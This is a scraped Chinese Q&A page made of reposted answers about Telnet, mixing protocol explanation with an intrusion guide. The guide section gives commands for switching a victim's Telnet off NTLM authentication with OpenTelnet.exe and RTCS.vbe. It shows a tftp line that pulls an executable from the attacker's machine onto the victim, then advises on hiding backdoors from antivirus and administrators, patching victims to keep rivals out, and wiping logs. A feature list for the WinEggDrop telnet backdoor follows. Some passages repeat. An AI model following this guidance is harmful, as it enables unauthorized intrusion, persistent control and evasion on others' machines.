后门的种类繁多，也给我们提供了很大的选择余地，能够根据具体情况选择合适的后门的确是一门学问。常用的后门一般有：木马，asp木马，远程控制软件，克隆帐户，建立并隐藏帐户，telnet，telnet扩展的shell，终端服务等。安置一个好的后门通常要注意以下几点：

1 不会被防火墙查杀及阻碍通信：被加入病毒库的后门最好加壳以逃过防火墙，尽量用低端口通信，以免被防火墙屏蔽。

2 最大限度增加隐蔽性：如果你选择远程控制软件，要注意被控端的安装提示和小图标，以及是否同步画面；如果你在帐户上做文章，要尽量保持在cmd和用户管理中都不出破绽；如果你选择放木马或telnet扩展，要注意文件和进程的隐藏；如果新开了终端服务（入侵前并没有开），一定要该掉3389这个显眼的端口，且越低越好。

3 不要当管理员不存在：这是一个大忌，许多朋友在只有默认帐户的机器上建立类似'hacking'的管理员帐户，真是无知者无畏呀。所以安置后门的时候，想想管理员疏忽的地方会在哪里。


4 打补丁


如果想独霸肉鸡，就要会打补丁，要知道对肉鸡的竞争是很激烈的。怎么打补丁呢？这个也要问？想想你是怎么进来的吧。算了，提示一下，除了修补大的漏洞以外（上传官方补丁并运行），也要注意它的共享，ipc$共享（最好都关闭），可疑端口，容易被利用的服务等。不过打补丁也要注意隐蔽性的，不要让管理员发现大的改动。


5 清除日志

可以手动或利用软件，如果不太会就去找相关教材吧，在这里我不详细介绍了。


六 结束语

文章的前部分主要说了一些原理性的东西，后部分则侧重于应用，写的多了难免会有些遗漏


【Telnet命令详解 】
Telnet命令详解 


一 摘要 

Telnet的应用不仅方便了我们进行远程登录，也给hacker们提供了又一种入侵手段和后门，但无论如何，在你尽情享受Telnet所带给你的便捷的同时，你是否真正的了解Telnet呢？ 

二 远程登录 

Telnet服务虽然也属于客户机/服务器模型的服务，但它更大的意义在于实现了基于Telnet协议的远程登录（远程交互式计算），那么就让我们来认识一下远程登录。 

1 远程登陆的基本概念 

先来看看什么叫登录：分时系统允许多个用户同时使用一台计算机，为了保证系统的安全和记帐方便，系统要求每个用户有单独的帐号作为登录标识，系统还为每个用户指定了一个口令。用户在使用该系统之前要输入标识和口令，这个过程被称为'登录'。 

远程登陆是指用户使用Telnet命令，使自己的计算机暂时成为远程主机的一个仿真终端的过程。仿真终端等效于一个非智能的机器，它只负责把用户输入的每个字符传递给主机，再将主机输出的每个信息回显在屏幕上。 

2 远程登陆的产生及发展 

我们可以先构想一个提供远程文字编辑的服务，这个服务的实现需要一个接受编辑文件请求和数据的服务器以及一个发送此请求的客户机。客户机将建立一个从本地机到服务器的TCP连接，当然这需要服务器的应答，然后向服务器发送键入的信息（文件编辑信息），并读取从服务器返回的输出。以上便是一个标准而普通的客户机/服务器模型的服务。 

似乎有了客户机/服务器模型的服务，一切远程问题都可以解决了。然而实际并非你想象的那样简单，如果我们仅需要远程编辑文件，那么刚才所构想的服务完全可以胜任，但假如我们的要求并不是这么简单，我们还想实现远程用户管理，远程数据录入，远程系统维护，想实现一切可以在远程主机上实现的操作，那么我们将需要大量专用的服务器程序并为每一个可计算服务都使用一个服务器进程，随之而来的问题是：远程机器会很快对服务器进程应接不暇，并淹没在进程的海洋里（我们在这里排除最专业化的远程机器）。 

那么有没有办法解决呢？当然有，我们可以用远程登录来解决这一切。我们允许用户在远地机器上建立一个登录会话，然后通过执行命令来实现更一般的服务，就像在本地操作一样。这样，我们便可以访问远地系统上所有可用的命令，并且系统设计员不需提供多个专用地服务器程序。 

问题发展到这里好像前途一片光明了，用远程登录总应该解决问题了吧，但要实现远程登陆并不简单。不考虑网络设计的计算机系统期望用户只从直接相连的键盘和显示器上登录，在这种机器上增加远程登陆功能需要修改机器的操作系统，这是极其艰巨也是我们尽量避免的。因此我们应该集中力量构造远程登陆服务器软件，虽然这样也是比较困难的。为什么说这样做也比较困难呢？ 

举个例子来说：一般，操作系统会为一些特殊按键分配特殊的含义，比如本地系统将'Ctrl+C'解释为：'终止当前运行的命令进程'。但假设我们已经运行了远程登陆服务器软件，'Ctrl+C'也有可能无法被传送到远地机器，如果客户机真的将'Ctrl+C'传到了远地机器，那么'Ctrl+C'这个命令有可能不能终止本地的进程，也就是说在这里很可能会产生混乱。而且这仅仅是遇到的难题之一。 

但尽管有技术上的困难，系统编程人员还是设法构造了能够应用于大多数操作系统的远程登陆服务器软件，并构造了充当客户机的应用软件。通常，客户机软件取消了除一个键以外的所有键的本地解释，并将这些本地解释相应的转换成远地解释，这就使得客户机软件与远地机器的交互，就如同坐在远程主机面前一样，从而避免了上述所提到的混乱。而那个唯一例外的键，可以使用户回到本地环境。 

将远程登陆服务器设计为应用级软件，还有另一个要求，那就是需要操作系统提供对伪终端（pseudo terminal）的支持。我们用伪终端描述操作系统的入口点，它允许像Telnet服务器一样的程序向操作系统传送字符，并且使得字符像是来自本地键盘一样。只有使用这样的操作系统，才能将远程登陆服务器设计为应用级软件（比如Telnet服务器软件），否则，本地操作系统和远地系统传送将不能识别从对方传送过来的信息（因为它们仅能识别从本地键盘所键入的信息），远程登陆将宣告失败。 

将远程登陆服务器设计为应用级软件虽然有其显著的优点：比将代码嵌入操作系统更易修改和控制服务器。但其也有效率不高的缺点（后面的内容将会给予解释），好在用户键入信息的速率不高，这种设计还是可以接受的。 

3 远程登录的工作过程 

使用Telnet协议进行远程登陆时需要满足以下条件：在本的计算机上必须装有包含Telnet协议的客户程序；必须知道远程主机的Ip地址或域名；必须知道登录标识与口令。 

Telnet远程登录服务分为以下4个过程： 

1）本地与远程主机建立连接。该过程实际上是建立一个TCP连接，用户必须知道远程主机的Ip地址或域名； 

2）将本地终端上输入的用户名和口令及以后输入的任何命令或字符以NVT（Net Virtual Terminal）格式传送到远程主机。该过程实际上是从本地主机向远程主机发送一个IP数据报； 

3）将远程主机输出的NVT格式的数据转化为本地所接受的格式送回本地终端，包括输入命令回显和命令执行结果； 

4）最后，本地终端对远程主机进行撤消连接。该过程是撤销一个TCP连接。 

上面的内容只是讨论了远程登陆最基本的东西，其中的复杂和编程人员的艰辛是我们难以想象的，不知道你在舒服的使用Telnet的同时，是否想到了这些！ 

三 Telnet协议 

我们知道Telnet服务器软件是我们最常用的远程登录服务器软件，是一种典型的客户机/服务器模型的服务，它应用Telnet协议来工作。那么，什么是Telnet协议？它都具备哪些特点呢？ 

1 基本内容 

Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议。应用Telnet协议能够把本地用户所使用的计算机变成远程主机系统的一个终端。它提供了三种基本服务： 

1）Telnet定义一个网络虚拟终端为远的系统提供一个标准接口。客户机程序不必详细了解远的系统，他们只需构造使用标准接口的程序； 

2）Telnet包括一个允许客户机和服务器协商选项的机制，而且它还提供一组标准选项； 

3）Telnet对称处理连接的两端，即Telnet不强迫客户机从键盘输入，也不强迫客户机在屏幕上显示输出。 

2 适应异构 

为了使多个操作系统间的Telnet交互操作成为可能，就必须详细了解异构计算机和操作系统。比如，一些操作系统需要每行文本用ASCII回车控制符（CR）结束，另一些系统则需要使用ASCII换行符（LF），还有一些系统需要用两个字符的序列回车-换行（CR-LF）；再比如，大多数操作系统为用户提供了一个中断程序运行的快捷键，但这个快捷键在各个系统中有可能不同（一些系统使用CTRL+C，而另一些系统使用ESCAPE）。如果不考虑系统间的异构性，那么在本地发出的字符或命令，传送到远地并被远地系统解释后很可能会不准确或者出现错误。因此，Telnet协议必须解决这个问题。 

为了适应异构环境，Telnet协议定义了数据和命令在Internet上的传输方式，此定义被称作网络虚拟终端NVT（Net Virtual Terminal）。它的应用过程如下： 

对于发送的数据：客户机软件把来自用户终端的按键和命令序列转换为NVT格式，并发送到服务器，服务器软件将收到的数据和命令，从NVT格式转换为远地系统需要的格式； 
对于返回的数据：远地服务器将数据从远地机器的格式转换为NVT格式，而本地客户机将将接收到的NVT格式数据再转换为本地的格式。 
对于NVT格式的详细定义，有兴趣的朋友可以去查找相关资料。 

3 传送远地命令 

我们知道绝大多数操作系统都提供各种快捷键来实现相应的控制命令，当用户在本地终端键入这些快捷键的时候，本地系统将执行相应的控制命令，而不把这些快捷键作为输入。那么对于Telnet来说，它是用什么来实现控制命令的远地传送呢？ 

Telnet同样使用NVT来定义如何从客户机将控制功能传送到服务器。我们知道USASCII字符集包括95个可打印字符和33个控制码。当用户从本地键入普通字符时，NVT将按照其原始含义传送；当用户键入快捷键（组合键）时，NVT将把它转化为特殊的ASCII字符在网络上传送，并在其到达远地机器后转化为相应的控制命令。将正常ASCII字符集与控制命令区分主要有两个原因： 

1）这种区分意味着Telnet具有更大的灵活性：它可在客户机与服务器间传送所有可能的ASCII字符以及所有控制功能； 

2）这种区分使得客户机可以无二义性的指定信令，而不会产生控制功能与普通字符的混乱。 

4 数据流向 

上面我们提到过将Telnet设计为应用级软件有一个缺点，那就是：效率不高。这是为什么呢？下面给出Telnet中的数据流向： 

数据信息被用户从本地键盘键入并通过操作系统传到客户机程序，客户机程序将其处理后返回操作系统，并由操作系统经过网络传送到远地机器，远地操作系统将所接收数据传给服务器程序，并经服务器程序再次处理后返回到操作系统上的伪终端入口点，最后，远地操作系统将数据传送到用户正在运行的应用程序，这便是一次完整的输入过程；输出将按照同一通路从服务器传送到客户机。 

因为每一次的输入和输出，计算机将切换进程环境好几次，这个开销是很昂贵的。还好用户的键入速率并不算高，这个缺点我们仍然能够接受。 

5 强制命令 

我们应该考虑到这样一种情况：假设本地用户运行了远地机器的一个无休止循环的错误命令或程序，且此命令或程序已经停止读取输入，那么操作系统的缓冲区可能因此而被占满，如果这样，远地服务器也无法再将数据写入伪终端，并且最终导致停止从TCP连接读取数据，TCP连接的缓冲区最终也会被占满，从而导致阻止数据流流入此连接。如果以上事情真的发生了，那么本地用户将失去对远地机器的控制。 

为了解决此问题，Telnet协议必须使用外带信令以便强制服务器读取一个控制命令。我们知道TCP用紧急数据机制实现外带数据信令，那么Telnet只要再附加一个被称为数据标记(date mark)的保留八位组，并通过让TCP发送已设置紧急数据比特的报文段通知服务器便可以了，携带紧急数据的报文段将绕过流量控制直接到达服务器。作为对紧急信令的相应，服务器将读取并抛弃所有数据，直到找到了一个数据标记。服务器在遇到了数据标记后将返回正常的处理过程。 

6 选项协商 

由于Telnet两端的机器和操作系统的异构性，使得Telnet不可能也不应该严格规定每一个telnet连接的详细配置，否则将大大影响Telnet的适应异构性。因此，Telnet采用选项协商机制来解决这一问题。 

Telnet选项的范围很广：一些选项扩充了大方向的功能，而一些选项制涉及一些微小细节。例如：有一个选项可以控制Telnet是在半双工还是全双工模式下工作（大方向）；还有一个选项允许远地机器上的服务器决定用户终端类型（小细节）。 

Telnet选项的协商方式也很有意思，它对于每个选项的处理都是对称的，即任何一端都可以发出协商申请；任何一端都可以接受或拒绝这个申请。另外，如果一端试图协商另一端不了解的选项，接受请求的一端可简单的拒绝协商。因此，有可能将更新，更复杂的Telnet客户机服务器版本与较老的，不太复杂的版本进行交互操作。如果客户机和服务器都理解新的选项，可能会对交互有所改善。否则，它们将一起转到效率较低但可工作的方式下运行。所有的这些设计，都是为了增强适应异构性，可见Telnet的适应异构性对其的应用和发展是多么重要。 

上面讨论了一些原理方面的东西，虽然我们在Telnet的使用过程中很难接触到这一层面，但我认为了解这些是有意义的，它会给我们带来许多启示。下面让我们来看看Win2000的Telnet服务。 

（本系列教程不定期更新，欲获得最新版本，请登陆官方网站：菜菜鸟社区 http://ccbirds.yeah.net/） 

四 Win2000的Telnet服务 

其实从应用层面上，Win2000的Telnet服务并没有什么可说的，绝大部分内容你都可以从HELP文件中得到，我在此只是把它稍微整理一下而已。 

1 基本配置 

Win2000为我们提供了Telnet客户机和服务器程序：Telnet.exe是客户机程序（Client），tlntsvr.exe是服务器程序（server），同时它还为我们提供了Telnet服务器管理程序tlntadmn.exe。 

Windows 2000 默认安装了 Telnet 服务，但是并没有默认启动。下面给出HELP文件中 Telnet 服务的一部分默认设置： 

AllowTrustedDomain：是否允许域用户访问。默认值是1，允许信任域用户访问。可以改为0: 不允许域用户访问（只允许本地用户）。 

DefaultDomain：可以对与该计算机具有信任关系的任何域设置。默认值是"."。 

DefaultShell：显示 shell 安装的路径位置。默认值是： %systemroot%\System32\Cmd.exe /q /k 

MaxFailedLogins：在连接终止之前显示尝试登录失败的最大次数。默认是3。 

LoginScript：显示 Telnet 服务器登录脚本的路径位置。默认的位置就是“%systemroot%\System32\login.cmd”，你可以更改脚本内容，这样登录进Telnet的欢迎屏幕就不一样了。 

NTLM：NTLM身份验证选项。默认是2。可以有下面这些值： 
0: 不使用 NTLM 身份验证。 
1: 先尝试 NTLM 身份验证，如果失败，再使用用户名和密码。 
2: 只使用 NTLM 身份验证。 

TelnetPort：显示 telnet 服务器侦听 telnet 请求的端口。默认是：23。你也可以更改为其他端口。 

以上各项设置你可以使用tlntadmn.exe（Telnet服务器管理程序）来进行非常方便的配置，配置后需要重新启动Telnet服务。如图1 

2 NTLM 

提到了telnet就不能不提NTLM，我想这也是让入侵者最为头痛的一件事，哪怕你获得了管理员帐号和密码，想简单通过NTLM也并非易事，况且win2000中的telnet默认仅以NTLM方式验证身份，这就让我们不得不关注NTLM这个东东，那么什么是NTLM呢？ 

早期的SMB协议在网络上明文传输口令，后来出现了"LAN Manager Challenge/Response"验证机制，简称LM，它十分简单以至很容易被破解，微软随后提出了WindowsNT挑战/响应验证机制，即NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。NTLM工作流程是这样的： 

1、客户端首先在本地加密当前用户的密码成为密码散列 
2、客户端向服务器发送自己的帐号，这个帐号是没有经过加密的，明文直接传输 
3、服务器产生一个16位的随机数字发送给客户端，作为一个 challenge（挑战） 
4、客户端再用加密后的密码散列来加密这个 challenge ，然后把这个返回给服务器。作为 response（响应） 
5、服务器把用户名、给客户端的challenge 、客户端返回的 response 这三个东西，发送域控制器 
6、域控制器用这个用户名在 SAM密码管理库中找到这个用户的密码散列，然后使用这个密码散列来加密 challenge。 
7、域控制器比较两次加密的 challenge ，如果一样，那么认证成功。 

从上面的过程我们可以看出，NTLM是以当前用户的身份向Telnet服务器发送登录请求的，而不是用你扫到的对方管理员的帐户和密码登录，显然，你的登录将会失败。举个例子来说，你家的机器名为A（本地机器），你入侵的机器名为B（远地机器），你在A上的帐户是xinxin，密码是1234，你扫到B的管理员帐号是Administrator，密码是5678，当你想Telnet到B时，NTLM将自动以当前用户的帐号和密码作为登录的凭据来进行上面的7项操作，即用xinxin和1234，而并非用你扫到的Administrator和5678，且这些都是自动完成的，根本不给你插手的机会，因此你的登录操作将失败。 

由于Telnet服务器对NTLM的使用有3个选项，所以当你Telnet远地机器时，会显示下面情况中的一种： 

1)身份验证选项=0时 
===================================== 
Microsoft (R) Windows (TM) Version 5.00 (Build 2195) 
Welcome to Microsoft Telnet Service 
Telnet Server Build 5.00.99201.1 
login: 
password: 

\\为0时不使用NTML身份验证，直接输入用户名和密码，比如你可以输入扫到的Administrator和5678 


2)身份验证选项=1时 
===================================== 
NTLM Authentication failed due to insufficient credentials. Please login withclear text username and password 
Microsoft (R) Windows (TM) Version 5.00 (Build 2195) 
Welcome to Microsoft Telnet Service 
Telnet Server Build 5.00.99201.1 
login: 
password: 

\\先尝试 NTLM 身份验证，如果失败，再使用用户名和密码，其实这种方式对于我们来说，与上一种方式没什么区别 


3)身份验证选项=2时 
===================================== 
NTLM Authentication failed due to insufficient credentials. Please login withclear text username and password 
Server allows NTLM authentication only 
Server has closed connection 
遗失对主机的连接。 
C:\> 

\\仔细看看上面的显示，根本没有给你输入用户名和密码的机会，直接断开连接，扫到了密码也是白扫 

所以对于入侵者来说，NTLM是横在我们面前的一座大山，必须要除掉它，一般我们有如下几种方法： 

1通过修改远程注册表更改telnet服务器配置，将验证方式从2改为1或0； 
2使用NTLM.exe，上传后直接运行，可将telnet服务器验证方式从2改为1； 
3在本地建立扫描到的用户，以此用户身份开启telnet客户机并进行远程登录； 
4使用软件，比如opentelnet.exe（需要管理员权限且开启IPC管道） 
5使用脚本，如RTCS，（需要管理员权限但不依赖IPC管道） 

基本上是以上的5种，其中后两种是我们比较常用的开telnet的手法，而且使用方法十分简单，命令如下： 

OpenTelnet.exe file://server/ username password NTLMAuthor telnetport 
OpenTelnet.exe \\服务器地址 管理员用户名 密码 验证方式（填0或1） telnet端口 

cscript RTCS.vbe targetIP username password NTLMAuthor telnetport 
cscript RTCS.vbe <目标IP> <管理员用户名> <密码> <验证方式> 

五 在telnet中该做什么 

本来写到上面就想结束了，不过许多朋友都说telnet上去后不知道该做什么了，既然这样，那我就抛砖引玉吧，这次不讲具体做法，只是说说思路，什么？为什么不讲具体做法？篇幅不够嘛，以后我会一一解释的。 

1 查看系统信息 

呵呵，其实就是随处看看，看看他的系统配置和版本（用type c:\boot.ini来知道pro版或server版），看看都装了什么服务或软件（从目录名就可以知道了），看看有什么重要或有趣的文件啦（唉，要是国外的机器，看也看不懂），看看他的用户情况，总之就是尽可能多的了解系统，为一会装后门摸底。 

2 使用tftp传送文件 

想必大家都遇到过在telnet中传输文件的问题，因为我们习惯了在ipc管道中的文件传输，所以有些朋友喜欢用net share ipc$ 来打开管道，进而利用copy来传输文件。不过这样反而麻烦，既然我们已经得到了shell，我们可以用TFPT命令来完成这一切，什么是TFTP呢？ 

用TFTP(Trivial File Transfer Protocol)来实现文件的传送是一种基于UDP连接的文件传输，一般是使用Windows自带的tftp.exe和一个TFTP服务器端软件构成一个完整的传输结构。它是这样使用的： 首先运行本地的TFTP Server（比如tftpd32.exe）软件并保证始终开启直至传输全部完成， 然后在telnet中（当然你也可以在其他shell中）运行下面的命令： 
C:\>tftp ?Ci ip get xinxin.exe c:\abc\xinxin.exe 
其中ip为你自己机器的ip，且上传文件要与TFTP服务器端在同一目录下，这样你就可以把xinxin.exe上传到c盘abc目录下了（其实是从tftp服务器下载来的） 

需要指出的是，如果使用代理IP，你将不能实现与外部网络的文件传送。因为你的代理网关在进行数据封装的时候会将自己的IP地址加入到你的数据报中，代替你的内部网络地址，所以在外部网络进行MAC寻址时是找不到你这台TFTP服务器的。 

3 安置后门 

安置后门放在第二步好像早了点，如果你入侵还有其他目的，比如以破坏为主，或者是来修改主页的，那么这些事情当然可以在安置后门之前做；如果你只是想得到一只肉鸡，那就没什么可说的了，安后门吧。 

后门的种类繁多，也给我们提供了很大的选择余地，能够根据具体情况选择合适的后门的确是一门学问。常用的后门一般有：木马，asp木马，远程控制软件，克隆帐户，建立并隐藏帐户，telnet，telnet扩展的shell，终端服务等。安置一个好的后门通常要注意以下几点： 

1 不会被防火墙查杀及阻碍通信：被加入病毒库的后门最好加壳以逃过防火墙，尽量用低端口通信，以免被防火墙屏蔽。 

2 最大限度增加隐蔽性：如果你选择远程控制软件，要注意被控端的安装提示和小图标，以及是否同步画面；如果你在帐户上做文章，要尽量保持在cmd和用户管理中都不出破绽；如果你选择放木马或telnet扩展，要注意文件和进程的隐藏；如果新开了终端服务（入侵前并没有开），一定要该掉3389这个显眼的端口，且越低越好。 

3 不要当管理员不存在：这是一个大忌，许多朋友在只有默认帐户的机器上建立类似'hacking'的管理员帐户，真是无知者无畏呀。所以安置后门的时候，想想管理员疏忽的地方会在哪里。 

4 打补丁：如果想独霸肉鸡，就要会打补丁，要知道对肉鸡的竞争是很激烈的。怎么打补丁呢？这个也要问？想想你是怎么进来的吧。算了，提示一下，除了修补大的漏洞以外（上传官方补丁并运行），也要注意它的共享，ipc$共享（最好都关闭），可疑端口，容易被利用的服务等。不过打补丁也要注意隐蔽性的，不要让管理员发现大的改动。 

5 清除日志：可以手动或利用软件，如果不太会就去找相关教材吧，在这里我不详细介绍了。 
回答者：飘然千里 - 助理 二级 2-23 19:29

--------------------------------------------------------------------------------

Telnet是进行远程登录的标准协议和主要方式它为用户提供了在本地计算机上完成远程主机工作的能力。通过使用Telnet,Internet用户可以与全世界许多信息中心图书馆及其它信息资源联系。Telnet远程登录的使用主要有两种情况。第一种是用户在远程主祝上有自己的帐号(Account)，即用户拥有注册的用户名和口令；第二种是许多Internet主机为用户提供了某种形式的公共Telnet信息资源，这种资源对于每一个Telnet用户都是开放的。Telnet是使用最为简单的Internet工具之一。 

telnet /? 

命令可以缩写。支持的命令为: 

c- 关闭 关闭当前连接 
d- 显示 显示操作参数 
o- 打开主机名 [端口]连接到一个主机名(默认端口 23) 
q- 退出 退出 telnet 
set- 设置 设置选项(要列表，请键入 \'set ?\') 
sen- 发送 将字符串送到服务器 
st - 状态 打印状态信息 
u- 解除设置 解除设置选项(要列表，请键入 \'unset ?\') 
?/h- 帮助 打印帮助信息 


一 摘要 
二 远程登录 
三 Telnet协议 
四 Win2000的Telnet服务 
五 在telnet中该做什么 

一 摘要 
Telnet的应用不仅方便了我们进行远程登录，也给hacker们提供了又一种入侵手段和后门，但无论如何，在你尽情享受Telnet所带给你的便捷的同时，你是否真正的了解Telnet呢？ 

二 远程登录 

Telnet服务虽然也属于客户机/服务器模型的服务，但它更大的意义在于实现了基于Telnet协议的远程登录（远程交互式计算），那么就让我们来认识一下远程登录。 

1 远程登陆的基本概念 

先来看看什么叫登录：分时系统允许多个用户同时使用一台计算机，为了保证系统的安全和记帐方便，系统要求每个用户有单独的帐号作为登录标识，系统还为每个用户指定了一个口令。用户在使用该系统之前要输入标识和口令，这个过程被称为\'登录\'。 
远程登陆是指用户使用Telnet命令，使自己的计算机暂时成为远程主机的一个仿真终端的过程。仿真终端等效于一个非智能的机器，它只负责把用户输入的每个字符传递给主机，再将主机输出的每个信息回显在屏幕上。 

2 远程登陆的产生及发展 

我们可以先构想一个提供远程文字编辑的服务，这个服务的实现需要一个接受编辑文件请求和数据的服务器以及一个发送此请求的客户机。客户机将建立一个从本地机到服务器的TCP连接，当然这需要服务器的应答，然后向服务器发送键入的信息（文件编辑信息），并读取从服务器返回的输出。以上便是一个标准而普通的客户机/服务器模型的服务。 
似乎有了客户机/服务器模型的服务，一切远程问题都可以解决了。然而实际并非你想象的那样简单，如果我们仅需要远程编辑文件，那么刚才所构想的服务完全可以胜任，但假如我们的要求并不是这么简单，我们还想实现远程用户管理，远程数据录入，远程系统维护，想实现一切可以在远程主机上实现的操作，那么我们将需要大量专用的服务器程序并为每一个可计算服务都使用一个服务器进程，随之而来的问题是：远程机器会很快对服务器进程应接不暇，并淹没在进程的海洋里（我们在这里排除最专业化的远程机器）。 
那么有没有办法解决呢？当然有，我们可以用远程登录来解决这一切。我们允许用户在远地机器上建立一个登录会话，然后通过执行命令来实现更一般的服务，就像在本地操作一样。这样，我们便可以访问远地系统上所有可用的命令，并且系统设计员不需提供多个专用地服务器程序。 
问题发展到这里好像前途一片光明了，用远程登录总应该解决问题了吧，但要实现远程登陆并不简单。不考虑网络设计的计算机系统期望用户只从直接相连的键盘和显示器上登录，在这种机器上增加远程登陆功能需要修改机器的操作系统，这是极其艰巨也是我们尽量避免的。因此我们应该集中力量构造远程登陆服务器软件，虽然这样也是比较困难的。为什么说这样做也比较困难呢？ 
举个例子来说：一般，操作系统会为一些特殊按键分配特殊的含义，比如本地系统将\'Ctrl+C\'解释为：\'终止当前运行的命令进程\'。但假设我们已经运行了远程登陆服务器软件，\'Ctrl+C\'也有可能无法被传送到远地机器，如果客户机真的将\'Ctrl+C\'传到了远地机器，那么\'Ctrl+C\'这个命令有可能不能终止本地的进程，也就是说在这里很可能会产生混乱。而且这仅仅是遇到的难题之一。 
但尽管有技术上的困难，系统编程人员还是设法构造了能够应用于大多数操作系统的远程登陆服务器软件，并构造了充当客户机的应用软件。通常，客户机软件取消了除一个键以外的所有键的本地解释，并将这些本地解释相应的转换成远地解释，这就使得客户机软件与远地机器的交互，就如同坐在远程主机面前一样，从而避免了上述所提到的混乱。而那个唯一例外的键，可以使用户回到本地环境。 
将远程登陆服务器设计为应用级软件，还有另一个要求，那就是需要操作系统提供对伪终端（pseudo terminal）的支持。我们用伪终端描述操作系统的入口点，它允许像Telnet服务器一样的程序向操作系统传送字符，并且使得字符像是来自本地键盘一样。只有使用这样的操作系统，才能将远程登陆服务器设计为应用级软件（比如Telnet服务器软件），否则，本地操作系统和远地系统传送将不能识别从对方传送过来的信息（因为它们仅能识别从本地键盘所键入的信息），远程登陆将宣告失败。 
将远程登陆服务器设计为应用级软件虽然有其显著的优点：比将代码嵌入操作系统更易修改和控制服务器。但其也有效率不高的缺点（后面的内容将会给予解释），好在用户键入信息的速率不高，这种设计还是可以接受的。 

3 远程登录的工作过程 

使用Telnet协议进行远程登陆时需要满足以下条件：在本的计算机上必须装有包含Telnet协议的客户程序；必须知道远程主机的Ip地址或域名；必须知道登录标识与口令。 
Telnet远程登录服务分为以下4个过程： 
1）本地与远程主机建立连接。该过程实际上是建立一个TCP连接，用户必须知道远程主机的Ip地址或域名； 
2）将本地终端上输入的用户名和口令及以后输入的任何命令或字符以NVT（Net Virtual Terminal）格式传送到远程主机。该过程实际上是从本地主机向远程主机发送一个IP数据报； 
3）将远程主机输出的NVT格式的数据转化为本地所接受的格式送回本地终端，包括输入命令回显和命令执行结果； 
4）最后，本地终端对远程主机进行撤消连接。该过程是撤销一个TCP连接。 

上面的内容只是讨论了远程登陆最基本的东西，其中的复杂和编程人员的艰辛是我们难以想象的，不知道你在舒服的使用Telnet的同时，是否想到了这些！ 

三 Telnet协议 

我们知道Telnet服务器软件是我们最常用的远程登录服务器软件，是一种典型的客户机/服务器模型的服务，它应用Telnet协议来工作。那么，什么是Telnet协议？它都具备哪些特点呢？ 

1 基本内容 

Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议。应用Telnet协议能够把本地用户所使用的计算机变成远程主机系统的一个终端。它提供了三种基本服务： 
1）Telnet定义一个网络虚拟终端为远的系统提供一个标准接口。客户机程序不必详细了解远的系统，他们只需构造使用标准接口的程序； 
2）Telnet包括一个允许客户机和服务器协商选项的机制，而且它还提供一组标准选项； 
3）Telnet对称处理连接的两端，即Telnet不强迫客户机从键盘输入，也不强迫客户机在屏幕上显示输出。 

2 适应异构 

为了使多个操作系统间的Telnet交互操作成为可能，就必须详细了解异构计算机和操作系统。比如，一些操作系统需要每行文本用ASCII回车控制符（CR）结束，另一些系统则需要使用ASCII换行符（LF），还有一些系统需要用两个字符的序列回车-换行（CR-LF）；再比如，大多数操作系统为用户提供了一个中断程序运行的快捷键，但这个快捷键在各个系统中有可能不同（一些系统使用CTRL+C，而另一些系统使用ESCAPE）。如果不考虑系统间的异构性，那么在本地发出的字符或命令，传送到远地并被远地系统解释后很可能会不准确或者出现错误。因此，Telnet协议必须解决这个问题。 
为了适应异构环境，Telnet协议定义了数据和命令在Internet上的传输方式，此定义被称作网络虚拟终端NVT（Net Virtual Terminal）。它的应用过程如下： 
对于发送的数据：客户机软件把来自用户终端的按键和命令序列转换为NVT格式，并发送到服务器，服务器软件将收到的数据和命令，从NVT格式转换为远地系统需要的格式； 
对于返回的数据：远地服务器将数据从远地机器的格式转换为NVT格式，而本地客户机将将接收到的NVT格式数据再转换为本地的格式。 
对于NVT格式的详细定义，有兴趣的朋友可以去查找相关资料。 

3 传送远地命令 

我们知道绝大多数操作系统都提供各种快捷键来实现相应的控制命令，当用户在本地终端键入这些快捷键的时候，本地系统将执行相应的控制命令，而不把这些快捷键作为输入。那么对于Telnet来说，它是用什么来实现控制命令的远地传送呢？ 
Telnet同样使用NVT来定义如何从客户机将控制功能传送到服务器。我们知道USASCII字符集包括95个可打印字符和33个控制码。当用户从本地键入普通字符时，NVT将按照其原始含义传送；当用户键入快捷键（组合键）时，NVT将把它转化为特殊的ASCII字符在网络上传送，并在其到达远地机器后转化为相应的控制命令。将正常ASCII字符集与控制命令区分主要有两个原因： 
1）这种区分意味着Telnet具有更大的灵活性：它可在客户机与服务器间传送所有可能的ASCII字符以及所有控制功能； 
2）这种区分使得客户机可以无二义性的指定信令，而不会产生控制功能与普通字符的混乱。 
回答者：kinllen - 高级经理 六级 2-23 19:31

--------------------------------------------------------------------------------

Telnet是传输控制协议／因特网协议(TCP／IP)网络(例如Internet)的登录和仿真程序。它最初是由ARPANET开发的，但是现在它主要用于Internet会话。它的基本功能是，允许用户登录进入远程主机系统。以前，Telnet是一个将所有用户输入送到远方主机进行处理的简单的终端程序。它的一些较新的版本在本地执行更多的处理，于是可以提供更好的响应，并且减少了通过链路发送到远程主机的信息数量。 

Telnet是一种客户机／服务器处理方式，其中，用户在本地系统生成Telnet应用，并和远程主机上运行的Telnet进程建立一条链路。这个用户在他的键盘上发出请求，这个请求被传送到系统上运行的Telnet客户。然后，Telnet将这个请求传送给远程的Telnet服务器。通过这个过程，用户就能启动远程程序，并且就象他们直接与这个远程主机相连接那样，从他们自己的系统上就可以运行这些程序。大多数进程是在远程主机上运行的，它从用户的系统接收请求，并在它的工作空间内处理它们，从而减少了在这条链路上的通信量。 
远程登录主机（包括计算机，交换机，路由器等等） 
http://www.softhouse.com.cn/html/200505/2005052413375100007625.html 
http://www.zzzha.com/showart.asp?art_id=37 
朋友去看看这两个网站，有详细解答，谢谢 


【telnet木马WinEggDrop Shell 极终版使用说明书】
程序说明:一个扩展型的telnet后门程序

特点:
1.比较小型，除了用汇编写外，同样功能，同样质量和同类型的后门程序，不怎么可能会写得比这
个更小的了。
2.有其它同类型后门程序(推出比这个早的同类型后门)没有的功能,如clone(克隆帐户),installterm
(安装终端服务),fport(这个不太肯定，据闻红盟那个hgod什么的也有这功能),sid,控制台模式的
注册表操作,Sock5代理等等功能.
3.完善的在线帮助,对于带参数命令，如果忘记语法，只要输入那个命令，就可以看到用法和一个
例子.
自己使用过后，才可以清楚感受到这后门程序的特色以及和其它后门程序间的分别。

特别声明:使用前请将说明文件看明白。

Private Version功能
1.Pslist 功能说明:显示进程
2.ListIP 功能说明:显示系统所有IP和域名
3.ShowSID 功能说明:显示所有系统帐户的SID(读注册表中sam下的值得到)
4.Fport 功能说明:进程打开的端口列表
5.Online 功能说明:列出所有连接进去这个后门的用户的IP
